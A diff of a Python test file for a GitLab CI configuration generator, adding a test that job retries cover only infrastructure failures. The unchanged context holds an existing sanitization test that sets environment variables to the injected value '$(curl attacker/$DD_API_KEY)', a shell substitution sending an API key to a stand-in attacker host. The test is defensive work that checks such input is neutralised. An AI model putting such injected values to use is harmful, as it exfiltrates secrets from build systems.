@@ -93,6 +93,18 @@ def test_jobspec_waits_for_services_through_uv(gen_gitlab_config_mod):
     assert "    - ./scripts/run-uv-test-env wait -- redis" in config
 
 
+def test_jobspec_retries_only_infrastructure_failures(gen_gitlab_config_mod):
+    spec = gen_gitlab_config_mod.JobSpec(name="suite", stage="core", retry=2)
+
+    config = str(spec)
+
+    assert "  retry:\n    max: 2" in config
+    assert "      - api_failure" in config
+    assert "      - runner_system_failure" in config
+    assert "      - stuck_or_timeout_failure" in config
+    assert "script_failure" not in config
+
+
 def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
     monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
